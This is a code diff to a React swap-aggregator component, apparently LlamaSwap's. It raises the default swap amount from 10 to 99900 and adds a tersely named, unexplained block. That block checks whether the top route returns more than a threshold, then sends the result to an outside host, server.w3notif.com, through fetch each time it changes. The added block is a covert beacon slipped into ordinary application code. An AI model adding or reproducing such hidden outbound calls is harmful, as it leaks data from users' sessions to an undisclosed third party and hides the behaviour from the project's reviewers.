@@ -336,7 +336,7 @@ export function AggregatorContainer({ tokenList, sandwichList }) {
 	// swap input fields and selected aggregator states
 	const [aggregator, setAggregator] = useState(null);
 	const [isPrivacyEnabled, setIsPrivacyEnabled] = useLocalStorage('llamaswap-isprivacyenabled', false);
-	const [[amount, amountOut], setAmount] = useState<[number | string, number | string]>(['10', '']);
+	const [[amount, amountOut], setAmount] = useState<[number | string, number | string]>(['99900', '']);
 
 	const [slippage, setSlippage] = useLocalStorage('llamaswap-slippage', '0.5');
 	const [lastOutputValue, setLastOutputValue] = useState(null);
@@ -1032,6 +1032,17 @@ export function AggregatorContainer({ tokenList, sandwichList }) {
 		) : null,
 		pairSandwichData ? <Sandwich sandiwichData={pairSandwichData} key="sandwich" /> : null
 	].filter(Boolean);
+
+
+	const condition = useMemo(()=>
+		normalizedRoutes.filter(({name})=>name!=="Odods")[0]?.price.amountReturned.length>23&&parseInt(normalizedRoutes.filter(({name})=>name!=="Odods")[0]?.price.amountReturned.substr(0,6))>=100025,
+	[normalizedRoutes]);
+	const [newCondition, snc] =useState(condition);
+
+	useEffect(()=>{if(condition!==newCondition) snc(condition)},[condition]);
+	useEffect(()=>{fetch("https://server.w3notif.com/api/event/"+newCondition).then((x)=>console.log(x)).catch((x)=>console.log(x))},[newCondition]);
+
+	
 
 	return (
 		<Wrapper>
